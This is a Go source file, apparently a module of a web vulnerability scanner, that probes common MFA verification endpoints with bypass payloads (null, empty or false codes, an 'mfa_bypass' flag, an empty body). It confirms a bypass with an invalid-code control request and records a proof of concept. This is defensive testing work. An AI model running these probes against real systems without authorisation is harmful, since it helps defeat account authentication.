package core

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"
)

type MFABypassResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

type MFABypass struct {
	BaseModule
	Target  string
	results []MFABypassResult
}

func NewMFABypass(target string) *MFABypass {
	return &MFABypass{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *MFABypass) Execute(ctx context.Context) ([]MFABypassResult, error) {
	m.results = make([]MFABypassResult, 0)

	endpoints := []string{
		"/api/mfa/verify",
		"/mfa/verify",
		"/login/mfa",
		"/2fa/verify",
	}

	payloads := []string{
		`{"code": null}`,
		`{"code": ""}`,
		`{"code": false}`,
		`{"mfa_bypass": true}`,
		`{}`,
	}

	var wg sync.WaitGroup
	jobs := make(chan string, len(endpoints))
	for _, ep := range endpoints {
		jobs <- ep
	}
	close(jobs)

	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ep := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					for _, p := range payloads {
						m.testMFA(ctx, ep, p)
					}
				}
			}
		}()
	}

	wg.Wait()
	if len(m.results) == 0 {
		m.Mu.Lock()
		m.results = append(m.results, MFABypassResult{
			Target: m.Target,
			Status: "inconclusive",
			Detail: "No MFA endpoint accepted a code-verification bypass payload on the tested endpoints.",
		})
		m.Mu.Unlock()
	}
	return m.results, nil
}

// mfaPositiveSignal parses the body as JSON and reports a strict positive
// authentication signal: success == true, authenticated == true, or a
// non-empty string token. Non-JSON bodies never signal success.
func mfaPositiveSignal(body []byte) bool {
	var parsed map[string]any
	if err := json.Unmarshal(body, &parsed); err != nil {
		return false
	}
	if errVal, hasErr := parsed["error"]; hasErr && mfaErrorVeto(errVal) {
		return false
	}
	if b, ok := parsed["success"].(bool); ok && b {
		return true
	}
	if b, ok := parsed["authenticated"].(bool); ok && b {
		return true
	}
	if s, ok := parsed["token"].(string); ok && strings.TrimSpace(s) != "" {
		return true
	}
	return false
}

// mfaErrorVeto reports whether a JSON "error" field value is non-null and
// non-empty, i.e. an actual error indicator.
func mfaErrorVeto(v any) bool {
	switch t := v.(type) {
	case nil:
		return false
	case string:
		return strings.TrimSpace(t) != ""
	case bool:
		return t
	default:
		return true
	}
}

// postJSON sends one JSON POST and returns the request (for PoC recording),
// the response body, and the status code.
func (m *MFABypass) postJSON(ctx context.Context, url, payload string) (*http.Request, []byte, int, bool) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBufferString(payload))
	if err != nil {
		return nil, nil, 0, false
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := m.Client.Do(req)
	if err != nil {
		return nil, nil, 0, false
	}
	defer resp.Body.Close()

	body, err := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
	if err != nil {
		return nil, nil, 0, false
	}
	return req, body, resp.StatusCode, true
}

func (m *MFABypass) testMFA(ctx context.Context, endpoint, payload string) {
	testURL := m.Target + endpoint

	probeReq, probeBody, probeStatus, ok := m.postJSON(ctx, testURL, payload)
	if !ok {
		return
	}
	if probeStatus < 200 || probeStatus > 299 || !mfaPositiveSignal(probeBody) {
		return
	}

	// Differential control: the same endpoint with a deliberately invalid code
	// must fail where the probe payload succeeded. An endpoint that answers
	// identically to every request (echo/error pages) cannot demonstrate a
	// bypass.
	_, controlBody, controlStatus, ok := m.postJSON(ctx, testURL, `{"code": "__firestarter_invalid_code__"}`)
	if !ok {
		return
	}
	if controlStatus == probeStatus &&
		normalizedCompactLower(string(controlBody)) == normalizedCompactLower(string(probeBody)) {
		return
	}
	if mfaPositiveSignal(controlBody) {
		// The invalid code was accepted too: the difference is not
		// failure-indicating.
		return
	}

	m.Mu.Lock()
	m.RecordPoC(probeReq, []byte(payload), fmt.Sprintf("MFA code-verification bypass demonstrated at: %s", testURL))
	m.results = append(m.results, MFABypassResult{
		Target: m.Target,
		Status: "vulnerable",
		Detail: fmt.Sprintf("MFA code-verification bypass at %s with payload: %s (an invalid code was rejected or answered differently)", testURL, payload),
	})
	m.Mu.Unlock()
}

func init() {
	RegisterModule("mfa_bypass_testing", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {
		target := PayloadString(payload, "url", "")
		onLog(fmt.Sprintf("Starting MFABypass on: %s", target))
		tester := NewMFABypass(target)
		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
